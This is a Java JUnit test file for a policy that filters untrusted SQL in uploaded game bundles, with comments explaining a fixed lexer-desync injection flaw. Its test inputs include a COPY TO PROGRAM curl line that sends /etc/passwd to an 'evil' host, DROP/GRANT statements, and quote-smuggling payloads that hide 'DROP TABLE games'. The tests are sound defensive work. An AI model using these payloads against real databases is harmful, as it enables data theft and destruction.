package games.snapdragon.bff.upload;

import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.web.server.ResponseStatusException;

import java.util.List;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatCode;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * Pinning specs for {@link RegisterSqlPolicy}.
 *
 * <p>register.sql is attacker-controlled bundle content executed inside the
 * install transaction. The policy is the containment for the OWASP-flagged
 * arbitrary-SQL primitive. The contracts locked in here:
 *
 * <ul>
 *   <li>the exact statements the export plugin / makers emit (INSERT into the
 *       catalog tables, ON CONFLICT upserts, the games feature-flag UPDATE)
 *       all pass — the legitimate upload path is not broken;</li>
 *   <li>every other verb (DROP/DELETE/TRUNCATE/GRANT/COPY/CREATE/ALTER/DO/
 *       SELECT) is rejected;</li>
 *   <li>INSERT/UPDATE of a non-catalog table (player data, role scopes) is
 *       rejected;</li>
 *   <li>any reference to the server-owned {@code domain} column — column list,
 *       SET clause, or ON CONFLICT DO UPDATE — is rejected, while the word
 *       {@code domain} inside a string value is allowed;</li>
 *   <li>{@code vet()} fails the whole blob if any one statement is disallowed,
 *       and drops comment-only fragments.</li>
 * </ul>
 */
class RegisterSqlPolicyTest {

    // ── the real generator output (manifest_builder.to_register_sql) ────────

    private static final String GAMES_INSERT = """
            INSERT INTO games (name, description, slug, sort_order, created_at)
            VALUES ('My Game', 'a fun game', 'my-game', 0, NOW())
            ON CONFLICT (slug) DO UPDATE SET name = EXCLUDED.name, description = EXCLUDED.description""";

    private static final String LEVELS_INSERT = """
            INSERT INTO levels (name, description, slug, scene_type, sort_order, asset_url, scene_config, game_id, created_at)
            SELECT 'Cave', '', 'cave', 'cave', 1, '/assets/x', '{}'::jsonb, g.id, NOW() FROM games g WHERE g.slug = 'my-game'
            ON CONFLICT (slug) DO UPDATE SET asset_url = EXCLUDED.asset_url, scene_type = EXCLUDED.scene_type""";

    private static final String FEDERATION_INSERT = """
            INSERT INTO federation_modules (slug, display_name, kind, remote_entry_url, exposed_module, game_slug, version, enabled, metadata)
            VALUES ('my-game', 'My Game', 'remote-game', '/r/x', './GameRoot', 'my-game', '0.1.0', true, '{}'::jsonb)
            ON CONFLICT (slug) DO UPDATE
              SET display_name = EXCLUDED.display_name, remote_entry_url = EXCLUDED.remote_entry_url,
                  version = EXCLUDED.version, metadata = EXCLUDED.metadata, enabled = true, updated_at = NOW()""";

    private static final String GAME_ACCESS_INSERT = """
            INSERT INTO game_access (game_id, scope, scope_value, granted_by, granted_at)
            SELECT g.id, 'all', NULL, 'system:upload', NOW() FROM games g WHERE g.slug = 'my-game'
            ON CONFLICT (game_id, scope, scope_value) DO NOTHING""";

    private static final String FEATURES_UPDATE =
            "UPDATE games SET features = '{\"pvp\":true}'::jsonb WHERE slug = 'my-game'";

    private static final String EVENT_SUPPORT_INSERT = """
            INSERT INTO game_event_support (game_slug, event_kind, event_type, direction)
            VALUES ('my-game', 'move', 'tick', 'both')
            ON CONFLICT (game_slug, event_kind, event_type) DO UPDATE SET direction = EXCLUDED.direction, enabled = true""";

    @Test
    void acceptsEveryRealGeneratorStatement() {
        for (String stmt : List.of(GAMES_INSERT, LEVELS_INSERT, FEDERATION_INSERT,
                GAME_ACCESS_INSERT, FEATURES_UPDATE, EVENT_SUPPORT_INSERT)) {
            assertThatCode(() -> RegisterSqlPolicy.validate(stmt))
                    .as("legit generator statement must pass: %s", stmt)
                    .doesNotThrowAnyException();
        }
    }

    @Test
    void vetsAndReturnsTheWholeGeneratorBlob() {
        String blob = "-- Generated by Snapdragon Export plugin\n\n"
                + GAMES_INSERT + ";\n\n" + LEVELS_INSERT + ";\n\n"
                + FEDERATION_INSERT + ";\n\n" + GAME_ACCESS_INSERT + ";\n\n"
                + FEATURES_UPDATE + ";\n\n" + EVENT_SUPPORT_INSERT + ";\n";
        List<String> stmts = RegisterSqlPolicy.vet(blob);
        // Comment-only fragment dropped; six real statements vetted in order.
        assertThat(stmts).hasSize(6);
        assertThat(stmts.get(0)).startsWith("INSERT INTO games");
        assertThat(stmts.get(4)).startsWith("UPDATE games SET features");
    }

    // ── verb allowlist ──────────────────────────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
            "DROP TABLE games",
            "DELETE FROM player_characters",
            "TRUNCATE TABLE games",
            "GRANT ALL ON games TO attacker",
            "REVOKE SELECT ON games FROM app",
            "COPY games TO PROGRAM 'curl http://evil/$(cat /etc/passwd)'",
            "CREATE FUNCTION pwn() RETURNS void AS $$ $$ LANGUAGE sql",
            "ALTER TABLE games ADD COLUMN pwned text",
            "DO $$ BEGIN PERFORM 1; END $$",
            "SELECT * FROM player_characters",
            "SET ROLE postgres",
            "WITH x AS (SELECT 1) INSERT INTO games (slug) SELECT 1 FROM x",
    })
    void rejectsNonInsertUpdateVerbs(String stmt) {
        assertReject(stmt);
    }

    // ── table allowlist ──────────────────────────────────────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
            "INSERT INTO player_characters (level) VALUES (9999)",
            "INSERT INTO publisher_game_scopes (casdoor_id, game_slug) VALUES ('me', 'rival-game')",
            "INSERT INTO mod_game_scopes (casdoor_id, game_slug) VALUES ('me', 'x')",
            "UPDATE player_characters SET level = 9999 WHERE id = 1",
            "UPDATE publisher_game_scopes SET game_slug = 'all'",
    })
    void rejectsNonCatalogTables(String stmt) {
        assertReject(stmt);
    }

    // ── tenant-capture via the server-owned domain column ────────────────────

    @ParameterizedTest
    @ValueSource(strings = {
            "UPDATE games SET domain = 'brand-y' WHERE slug = 'my-game'",
            "UPDATE games SET features = '{}'::jsonb, domain = 'brand-y' WHERE slug = 'my-game'",
            "INSERT INTO games (slug, domain) VALUES ('my-game', 'brand-y')",
            "INSERT INTO games (slug, name) VALUES ('my-game', 'X') ON CONFLICT (slug) DO UPDATE SET domain = 'brand-y'",
    })
    void rejectsAnyDomainColumnWrite(String stmt) {
        assertReject(stmt);
    }

    @Test
    void rejectsUpdateGamesToNonFeatureColumn() {
        assertReject("UPDATE games SET current_version_dir = 'file:/etc/passwd' WHERE slug = 'my-game'");
    }

    // ── string-literal awareness: the word "domain" in a value is fine ───────

    @Test
    void allowsDomainWordInsideStringValue() {
        String stmt = "INSERT INTO games (name, description, slug, sort_order, created_at) "
                + "VALUES ('Domain Wars', 'a game about domain control', 'domain-wars', 0, NOW())";
        assertThatCode(() -> RegisterSqlPolicy.validate(stmt)).doesNotThrowAnyException();
    }

    // ── multi-statement smuggling fails the whole blob ───────────────────────

    @Test
    void vetRejectsBlobWithOneSmuggledStatement() {
        String blob = GAMES_INSERT + ";\nDROP TABLE games;\n";
        assertThatThrownBy(() -> RegisterSqlPolicy.vet(blob))
                .isInstanceOf(ResponseStatusException.class)
                .hasMessageContaining("register.sql rejected");
    }

    @Test
    void semicolonInsideStringValueDoesNotSplit() {
        // A ';' inside a quoted value stays part of the one (benign) INSERT.
        List<String> stmts = RegisterSqlPolicy.vet(
                "INSERT INTO games (name, slug) VALUES ('a; b', 'my-game');\n");
        assertThat(stmts).hasSize(1);
    }

    // ── lexer-desync SQL-injection regressions (A03) ─────────────────────────
    //
    // The hand-rolled lexer used to treat a BACKSLASH as a quote-escape
    // (`c=='\'' && charAt(i-1)!='\\'`). Under Postgres 16's default
    // `standard_conforming_strings=on` a backslash is a LITERAL character, so a
    // value ending in `\'` actually CLOSES the string. The old lexer thought it
    // was still inside the literal, never saw the `;`, and returned the whole
    // blob as ONE statement that `validate()` then ALLOWed (prefix matches
    // `INSERT INTO games`) — smuggling a trailing `DROP TABLE games`/etc. that
    // `db.sql(blob).fetch()` runs over Postgres' multi-statement simple-query
    // protocol as the privileged role. These specs pin that the policy now
    // SPLITS and REJECTS such blobs. They FAIL on the pre-fix lexer (vet()
    // returns a 1-element list and throws nothing) and pass once the lexer
    // models standard-conforming strings + doubled quotes + E'' + $tag$ +
    // /* */.

    /**
     * The headline payload from the audit. `'a\'` is a COMPLETE 3-char string
     * literal under standard-conforming strings (backslash is data), so the
     * statement really ends at the first `;` and `DROP TABLE games` is a second,
     * disallowed statement. The old lexer mis-read `\'` as an escaped quote,
     * stayed "in string" through the `;`, and let the whole blob through.
     */
    @Test
    void rejectsBackslashQuoteLexerDesyncSmuggle() {
        assertThatThrownBy(() -> RegisterSqlPolicy.vet(
                "INSERT INTO games (name,slug) VALUES ('a\\', 'x'); DROP TABLE games; --"))
                .as("backslash is literal under standard_conforming_strings — must split + reject")
                .isInstanceOf(ResponseStatusException.class)
                .hasMessageContaining("register.sql rejected");
    }

    /**
     * A C-style escape string {@code E'...'} honours backslash escapes, so
     * {@code E'a\'...'} keeps the string open across the inner quote — the exact
     * opposite of a standard-conforming literal. Under the old lexer this blob
     * returns ONE allowed {@code INSERT INTO games …} statement (the smuggled
     * {@code DROP} hides inside the mis-lexed string), so {@code vet()} threw
     * nothing → the test FAILS pre-fix. The policy must REJECT {@code E'...'}
     * outright: the legitimate generator never emits it, and modelling C-escape
     * rules precisely is the footgun we're removing.
     */
    @Test
    void rejectsEscapeStringPayload() {
        assertThatThrownBy(() -> RegisterSqlPolicy.vet(
                "INSERT INTO games (name,slug) VALUES (E'a\\'; DROP TABLE games; --', 'x')"))
                .as("E'...' C-style escape strings must be rejected, not naively lexed")
                .isInstanceOf(ResponseStatusException.class)
                .hasMessageContaining("register.sql rejected");
    }

    /**
     * Dollar-quoting ({@code $tag$ ... $tag$}) is a string delimiter the lexer
     * never modelled. A lone single quote INSIDE a dollar-quoted body
     * ({@code $q$ ' $q$}) is DATA, but the old single-quote lexer reads it as
     * "string opened", swallows the following statement separator, and returns
     * ONE allowed {@code INSERT INTO games …} carrying the smuggled
     * {@code DROP TABLE games} — so {@code vet()} threw nothing → the test FAILS
     * pre-fix. The legitimate generator never uses dollar-quoting, so any bundle
     * that does must be rejected.
     */
    @Test
    void rejectsDollarQuotedPayload() {
        assertThatThrownBy(() -> RegisterSqlPolicy.vet(
                "INSERT INTO games (name,slug) VALUES ($q$ ' $q$, 'x'); DROP TABLE games; --"))
                .as("$tag$ dollar-quoting must be rejected, not lexed as bare identifiers")
                .isInstanceOf(ResponseStatusException.class)
                .hasMessageContaining("register.sql rejected");
    }

    /**
     * A C-style {@code /* *}{@code /} block comment can hide a {@code ;} or a
     * quote from a line-comment-only stripper, desyncing the split. The
     * generator emits only {@code --} banners, so a bundle with a block comment
     * is out-of-policy and must be rejected (or have the comment neutralised so
     * the smuggled tail is still seen + rejected).
     */
    @Test
    void rejectsBlockCommentDesyncPayload() {
        assertThatThrownBy(() -> RegisterSqlPolicy.vet(
                "INSERT INTO games (name,slug) VALUES ('a' /* ' */, 'x'); DROP TABLE games; --"))
                .as("/* */ block comments must not desync the lexer")
                .isInstanceOf(ResponseStatusException.class)
                .hasMessageContaining("register.sql rejected");
    }

    /**
     * The SQL-standard way to put a single quote in a literal is to DOUBLE it
     * ({@code ''}). A legitimate INSERT whose value contains an apostrophe must
     * STILL pass — the hardened lexer must consume {@code ''} as an in-string
     * escaped quote, not as a string close + reopen that desyncs the `;` split.
     * This guards against an over-correction that breaks the real upload path.
     */
    @Test
    void allowsDoubledSingleQuoteInValue() {
        List<String> stmts = RegisterSqlPolicy.vet(
                "INSERT INTO games (name, slug) VALUES ('Tom''s Quest', 'toms-quest');\n");
        assertThat(stmts).hasSize(1);
        assertThat(stmts.get(0)).startsWith("INSERT INTO games");
    }

    /**
     * A {@code ;} that sits inside a doubled-quote literal must NOT split the
     * statement — proves the {@code ''} handling keeps the lexer in-string
     * across the quote pair rather than treating the pair as close+reopen.
     */
    @Test
    void doubledQuoteWithSemicolonStaysOneStatement() {
        List<String> stmts = RegisterSqlPolicy.vet(
                "INSERT INTO games (name, slug) VALUES ('a '' ; b', 'my-game');\n");
        assertThat(stmts).hasSize(1);
    }

    private static void assertReject(String stmt) {
        assertThatThrownBy(() -> RegisterSqlPolicy.validate(stmt))
                .as("must reject: %s", stmt)
                .isInstanceOf(ResponseStatusException.class)
                .hasMessageContaining("register.sql rejected");
    }
}
